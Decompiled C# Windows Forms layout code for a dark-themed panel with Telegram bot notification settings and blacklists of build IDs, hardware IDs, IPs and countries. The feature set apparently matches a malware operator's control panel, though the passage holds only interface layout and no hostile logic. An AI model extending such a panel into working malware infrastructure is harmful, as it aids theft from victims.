		((System.Windows.Forms.Control)this.blackListChatIds).Cursor = System.Windows.Forms.Cursors.Default;
		((System.Windows.Forms.Control)this.blackListChatIds).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.blackListChatIds).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListBox)this.blackListChatIds).HorizontalScrollbar = true;
		((System.Windows.Forms.ListBox)this.blackListChatIds).ItemHeight = 18;
		((System.Windows.Forms.Control)this.blackListChatIds).Location = new System.Drawing.Point(577, 142);
		((System.Windows.Forms.Control)this.blackListChatIds).Name = "blackListChatIds";
		((System.Windows.Forms.Control)this.blackListChatIds).Size = new System.Drawing.Size(202, 218);
		((System.Windows.Forms.Control)this.blackListChatIds).TabIndex = 135;
		((System.Windows.Forms.Control)this.label49).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label49).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label49).Location = new System.Drawing.Point(577, 109);
		((System.Windows.Forms.Control)this.label49).Name = "label49";
		((System.Windows.Forms.Control)this.label49).Size = new System.Drawing.Size(202, 30);
		((System.Windows.Forms.Control)this.label49).TabIndex = 134;
		((System.Windows.Forms.Control)this.label49).Text = "BlackList Chat IDs";
		((System.Windows.Forms.Label)this.label49).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetButton)this.addRecipientIdBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addRecipientIdBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addRecipientIdBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.addRecipientIdBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.addRecipientIdBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addRecipientIdBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addRecipientIdBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addRecipientIdBtn).Location = new System.Drawing.Point(512, 366);
		((System.Windows.Forms.Control)this.addRecipientIdBtn).Name = "addRecipientIdBtn";
		((MetroSetButton)this.addRecipientIdBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addRecipientIdBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addRecipientIdBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.addRecipientIdBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addRecipientIdBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addRecipientIdBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addRecipientIdBtn).Size = new System.Drawing.Size(59, 23);
		((MetroSetButton)this.addRecipientIdBtn).Style = (Style)0;
		((MetroSetButton)this.addRecipientIdBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.addRecipientIdBtn).TabIndex = 133;
		((System.Windows.Forms.Control)this.addRecipientIdBtn).Text = "Add";
		((MetroSetButton)this.addRecipientIdBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.addRecipientIdBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.addRecipientIdBtn).Click += new System.EventHandler(addRecipientIdBtn_Click);
		((MetroSetButton)this.configRecipientIdBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.configRecipientIdBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.configRecipientIdBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.configRecipientIdBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.configRecipientIdBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.configRecipientIdBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.configRecipientIdBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.configRecipientIdBtn).Location = new System.Drawing.Point(369, 366);
		((System.Windows.Forms.Control)this.configRecipientIdBtn).Name = "configRecipientIdBtn";
		((MetroSetButton)this.configRecipientIdBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.configRecipientIdBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.configRecipientIdBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.configRecipientIdBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.configRecipientIdBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.configRecipientIdBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.configRecipientIdBtn).Size = new System.Drawing.Size(59, 23);
		((MetroSetButton)this.configRecipientIdBtn).Style = (Style)0;
		((MetroSetButton)this.configRecipientIdBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.configRecipientIdBtn).TabIndex = 132;
		((System.Windows.Forms.Control)this.configRecipientIdBtn).Text = "Config";
		((MetroSetButton)this.configRecipientIdBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.configRecipientIdBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.configRecipientIdBtn).Click += new System.EventHandler(configRecipientIdBtn_Click);
		((MetroSetButton)this.removeRecipientIdBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.removeRecipientIdBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.removeRecipientIdBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.removeRecipientIdBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.removeRecipientIdBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.removeRecipientIdBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.removeRecipientIdBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.removeRecipientIdBtn).Location = new System.Drawing.Point(440, 366);
		((System.Windows.Forms.Control)this.removeRecipientIdBtn).Name = "removeRecipientIdBtn";
		((MetroSetButton)this.removeRecipientIdBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.removeRecipientIdBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.removeRecipientIdBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.removeRecipientIdBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.removeRecipientIdBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.removeRecipientIdBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.removeRecipientIdBtn).Size = new System.Drawing.Size(59, 23);
		((MetroSetButton)this.removeRecipientIdBtn).Style = (Style)0;
		((MetroSetButton)this.removeRecipientIdBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.removeRecipientIdBtn).TabIndex = 131;
		((System.Windows.Forms.Control)this.removeRecipientIdBtn).Text = "Delete";
		((MetroSetButton)this.removeRecipientIdBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.removeRecipientIdBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.removeRecipientIdBtn).Click += new System.EventHandler(removeRecipientIdBtn_Click);
		((System.Windows.Forms.Control)this.recipientsIdsListBox).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ListBox)this.recipientsIdsListBox).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		((System.Windows.Forms.Control)this.recipientsIdsListBox).Cursor = System.Windows.Forms.Cursors.Default;
		((System.Windows.Forms.Control)this.recipientsIdsListBox).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.recipientsIdsListBox).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListBox)this.recipientsIdsListBox).HorizontalScrollbar = true;
		((System.Windows.Forms.ListBox)this.recipientsIdsListBox).ItemHeight = 18;
		((System.Windows.Forms.Control)this.recipientsIdsListBox).Location = new System.Drawing.Point(369, 142);
		((System.Windows.Forms.Control)this.recipientsIdsListBox).Name = "recipientsIdsListBox";
		((System.Windows.Forms.Control)this.recipientsIdsListBox).Size = new System.Drawing.Size(202, 218);
		((System.Windows.Forms.Control)this.recipientsIdsListBox).TabIndex = 128;
		((System.Windows.Forms.Control)this.label51).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label51).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label51).Location = new System.Drawing.Point(369, 109);
		((System.Windows.Forms.Control)this.label51).Name = "label51";
		((System.Windows.Forms.Control)this.label51).Size = new System.Drawing.Size(202, 30);
		((System.Windows.Forms.Control)this.label51).TabIndex = 127;
		((System.Windows.Forms.Control)this.label51).Text = "Recipient IDs";
		((System.Windows.Forms.Label)this.label51).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetButton)this.f3).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.f3).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.f3).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.f3).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.f3).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.f3).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.f3).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.f3).Location = new System.Drawing.Point(704, 415);
		((System.Windows.Forms.Control)this.f3).Name = "telegramBotStartBtn";
		((MetroSetButton)this.f3).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.f3).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.f3).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.f3).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.f3).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.f3).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.f3).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.f3).Style = (Style)0;
		((MetroSetButton)this.f3).StyleManager = null;
		((System.Windows.Forms.Control)this.f3).TabIndex = 120;
		((System.Windows.Forms.Control)this.f3).Text = "Start";
		((MetroSetButton)this.f3).ThemeAuthor = "Narwin";
		((MetroSetButton)this.f3).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.f3).Click += new System.EventHandler(f3_Click);
		((System.Windows.Forms.Control)this.f4).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.f4).Location = new System.Drawing.Point(458, 441);
		((System.Windows.Forms.Control)this.f4).Name = "telegramBotStatus";
		((System.Windows.Forms.Control)this.f4).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.f4).Style = (Style)1;
		((MetroSetLabel)this.f4).StyleManager = null;
		((System.Windows.Forms.Control)this.f4).TabIndex = 119;
		((System.Windows.Forms.Control)this.f4).Text = "Waiting";
		((System.Windows.Forms.Label)this.f4).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.f4).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.f4).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.f5).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.f5).Location = new System.Drawing.Point(367, 441);
		((System.Windows.Forms.Control)this.f5).Name = "telegramBotStatusLbl";
		((System.Windows.Forms.Control)this.f5).Size = new System.Drawing.Size(85, 25);
		((MetroSetLabel)this.f5).Style = (Style)1;
		((MetroSetLabel)this.f5).StyleManager = null;
		((System.Windows.Forms.Control)this.f5).TabIndex = 118;
		((System.Windows.Forms.Control)this.f5).Text = "Status of bot:";
		((System.Windows.Forms.Label)this.f5).TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		((MetroSetLabel)this.f5).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.f5).ThemeName = "MetroDark";
		((AnimaTextBox)this.f6).Dark = false;
		((System.Windows.Forms.Control)this.f6).Location = new System.Drawing.Point(366, 415);
		((AnimaTextBox)this.f6).MaxLength = 32767;
		((AnimaTextBox)this.f6).MultiLine = false;
		((System.Windows.Forms.Control)this.f6).Name = "telegramApiTokenTb";
		((AnimaTextBox)this.f6).Numeric = false;
		((AnimaTextBox)this.f6).ReadOnly = false;
		((System.Windows.Forms.Control)this.f6).Size = new System.Drawing.Size(334, 23);
		((System.Windows.Forms.Control)this.f6).TabIndex = 54;
		((AnimaTextBox)this.f6).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.f7).AutoSize = true;
		((System.Windows.Forms.Control)this.f7).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.f7).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.f7).Location = new System.Drawing.Point(369, 396);
		((System.Windows.Forms.Control)this.f7).Name = "telegramApiTokenLbl";
		((System.Windows.Forms.Control)this.f7).Size = new System.Drawing.Size(85, 15);
		((System.Windows.Forms.Control)this.f7).TabIndex = 53;
		((System.Windows.Forms.Control)this.f7).Text = "Bot API Token:";
		((System.Windows.Forms.Control)this.notificationTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.notificationTab).Controls.Add((System.Windows.Forms.Control)this.notificationTb);
		((System.Windows.Forms.Control)this.notificationTab).Font = new System.Drawing.Font("Segoe UI", 9f);
		((System.Windows.Forms.Control)this.notificationTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.notificationTab).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.notificationTab).Name = "notificationTab";
		((System.Windows.Forms.Control)this.notificationTab).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.notificationTab).TabIndex = 2;
		((System.Windows.Forms.Control)this.notificationTab).Text = "Notifications";
		((System.Windows.Forms.Control)this.notificationTb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TextBoxBase)this.notificationTb).BorderStyle = System.Windows.Forms.BorderStyle.None;
		((System.Windows.Forms.Control)this.notificationTb).Dock = System.Windows.Forms.DockStyle.Fill;
		((System.Windows.Forms.Control)this.notificationTb).ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.Control)this.notificationTb).Location = new System.Drawing.Point(0, 0);
		((System.Windows.Forms.Control)this.notificationTb).Name = "notificationTb";
		((System.Windows.Forms.TextBoxBase)this.notificationTb).ReadOnly = true;
		((System.Windows.Forms.RichTextBox)this.notificationTb).ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical;
		((System.Windows.Forms.Control)this.notificationTb).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.Control)this.notificationTb).TabIndex = 0;
		((System.Windows.Forms.Control)this.notificationTb).Text = "";
		((System.Windows.Forms.TextBoxBase)this.notificationTb).WordWrap = false;
		((System.Windows.Forms.Control)this.blackListsTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.importBuilds);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.addBlackBuildBtn);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.blackBuildIdTb);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.label52);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.blackListBuildsLb);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.label53);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.importCountries);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider11);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.metroSetButton2);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.importHWIDs);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.addBlackHwidBtn);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.blackHwidTb);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.label43);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.blackListHWIDsLb);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.label44);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.importIPs);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.addBlackIPBtn);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.blackIPTb);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.label23);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.blackListIPsLb);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.label24);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.addBlackCountryBtn);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.blackCountryTb);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.blackCountryLbl);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.blackListLb);
		((System.Windows.Forms.Control)this.blackListsTab).Controls.Add((System.Windows.Forms.Control)this.blackListLbl);
		((System.Windows.Forms.Control)this.blackListsTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.blackListsTab).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.blackListsTab).Name = "blackListsTab";
		((System.Windows.Forms.Control)this.blackListsTab).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.blackListsTab).TabIndex = 18;
		((System.Windows.Forms.Control)this.blackListsTab).Text = "Black Lists";
		((MetroSetButton)this.importBuilds).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.importBuilds).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.importBuilds).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.importBuilds).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.importBuilds).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.importBuilds).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.importBuilds).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.importBuilds).Location = new System.Drawing.Point(943, 401);
		((System.Windows.Forms.Control)this.importBuilds).Name = "importBuilds";
		((MetroSetButton)this.importBuilds).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.importBuilds).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.importBuilds).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.importBuilds).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.importBuilds).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.importBuilds).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.importBuilds).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.importBuilds).Style = (Style)0;
		((MetroSetButton)this.importBuilds).StyleManager = null;
		((System.Windows.Forms.Control)this.importBuilds).TabIndex = 147;
		((System.Windows.Forms.Control)this.importBuilds).Text = "From File";
		((MetroSetButton)this.importBuilds).ThemeAuthor = "Narwin";
		((MetroSetButton)this.importBuilds).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.importBuilds).Click += new System.EventHandler(importBuilds_Click);
		((MetroSetButton)this.addBlackBuildBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addBlackBuildBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addBlackBuildBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.addBlackBuildBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.addBlackBuildBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addBlackBuildBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addBlackBuildBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addBlackBuildBtn).Location = new System.Drawing.Point(943, 427);
		((System.Windows.Forms.Control)this.addBlackBuildBtn).Name = "addBlackBuildBtn";
		((MetroSetButton)this.addBlackBuildBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addBlackBuildBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addBlackBuildBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.addBlackBuildBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addBlackBuildBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addBlackBuildBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addBlackBuildBtn).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.addBlackBuildBtn).Style = (Style)0;
		((MetroSetButton)this.addBlackBuildBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.addBlackBuildBtn).TabIndex = 146;
		((System.Windows.Forms.Control)this.addBlackBuildBtn).Text = "Add";
		((MetroSetButton)this.addBlackBuildBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.addBlackBuildBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.addBlackBuildBtn).Click += new System.EventHandler(addBlackBuildBtn_Click);
		((AnimaTextBox)this.blackBuildIdTb).Dark = false;
		((System.Windows.Forms.Control)this.blackBuildIdTb).Location = new System.Drawing.Point(816, 427);
		((AnimaTextBox)this.blackBuildIdTb).MaxLength = 32767;
		((AnimaTextBox)this.blackBuildIdTb).MultiLine = false;
		((System.Windows.Forms.Control)this.blackBuildIdTb).Name = "blackBuildIdTb";
		((AnimaTextBox)this.blackBuildIdTb).Numeric = false;
		((AnimaTextBox)this.blackBuildIdTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.blackBuildIdTb).Size = new System.Drawing.Size(112, 23);
		((System.Windows.Forms.Control)this.blackBuildIdTb).TabIndex = 145;
		((AnimaTextBox)this.blackBuildIdTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label52).AutoSize = true;
		((System.Windows.Forms.Control)this.label52).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label52).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label52).Location = new System.Drawing.Point(819, 409);
		((System.Windows.Forms.Control)this.label52).Name = "label52";
		((System.Windows.Forms.Control)this.label52).Size = new System.Drawing.Size(89, 15);
		((System.Windows.Forms.Control)this.label52).TabIndex = 144;
		((System.Windows.Forms.Control)this.label52).Text = "Enter a build id:";
		((System.Windows.Forms.Control)this.blackListBuildsLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ListBox)this.blackListBuildsLb).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		((System.Windows.Forms.Control)this.blackListBuildsLb).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_7;
		((System.Windows.Forms.Control)this.blackListBuildsLb).Cursor = System.Windows.Forms.Cursors.Default;
		((System.Windows.Forms.Control)this.blackListBuildsLb).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.blackListBuildsLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListBox)this.blackListBuildsLb).HorizontalScrollbar = true;
		((System.Windows.Forms.ListBox)this.blackListBuildsLb).ItemHeight = 18;
		((System.Windows.Forms.Control)this.blackListBuildsLb).Location = new System.Drawing.Point(816, 211);
		((System.Windows.Forms.Control)this.blackListBuildsLb).Name = "blackListBuildsLb";
		((System.Windows.Forms.Control)this.blackListBuildsLb).Size = new System.Drawing.Size(202, 182);
		((System.Windows.Forms.Control)this.blackListBuildsLb).TabIndex = 143;
		((System.Windows.Forms.Control)this.label53).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label53).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label53).Location = new System.Drawing.Point(820, 178);
		((System.Windows.Forms.Control)this.label53).Name = "label53";
		((System.Windows.Forms.Control)this.label53).Size = new System.Drawing.Size(198, 30);
		((System.Windows.Forms.Control)this.label53).TabIndex = 142;
		((System.Windows.Forms.Control)this.label53).Text = "Black list build ids:";
		((System.Windows.Forms.Label)this.label53).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetButton)this.importCountries).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.importCountries).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.importCountries).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.importCountries).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.importCountries).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.importCountries).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.importCountries).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.importCountries).Location = new System.Drawing.Point(241, 401);
		((System.Windows.Forms.Control)this.importCountries).Name = "importCountries";
		((MetroSetButton)this.importCountries).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.importCountries).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.importCountries).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.importCountries).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.importCountries).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.importCountries).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.importCountries).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.importCountries).Style = (Style)0;
		((MetroSetButton)this.importCountries).StyleManager = null;
		((System.Windows.Forms.Control)this.importCountries).TabIndex = 141;
		((System.Windows.Forms.Control)this.importCountries).Text = "From File";
		((MetroSetButton)this.importCountries).ThemeAuthor = "Narwin";
		((MetroSetButton)this.importCountries).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.importCountries).Click += new System.EventHandler(importCountries_Click);
		((System.Windows.Forms.Control)this.metroSetDivider11).Location = new System.Drawing.Point(-5, 598);
		((System.Windows.Forms.Control)this.metroSetDivider11).Name = "metroSetDivider11";
		((MetroSetDivider)this.metroSetDivider11).Orientation = (DividerStyle)0;
